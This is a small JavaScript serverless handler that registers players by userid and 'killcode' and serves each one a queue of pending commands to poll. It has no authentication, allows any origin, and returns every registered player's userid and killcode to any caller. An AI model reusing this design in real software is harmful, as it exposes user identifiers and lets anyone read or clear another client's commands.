let players = [];

export default function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");

  if (req.method === "GET") {
    const { player, userid, killcode, timestamp, consume } = req.query;

    if (player && userid && killcode) {
      let entry = players.find(p => p.killcode === killcode);
      if (!entry) {
        entry = { player, userid, killcode, timestamp, commands: [] };
        players.push(entry);
      } else {
        entry.player = player;
        entry.userid = userid;
        entry.timestamp = timestamp || Date.now();
      }

      // If consume=1, clear the commands after returning
      if (consume === "1") {
        const cmds = [...entry.commands];
        entry.commands = [];
        return res.status(200).json(cmds);
      }
    }

    res.status(200).json(players);
    return;
  }

  res.status(405).json({ error: "Method not allowed" });
}
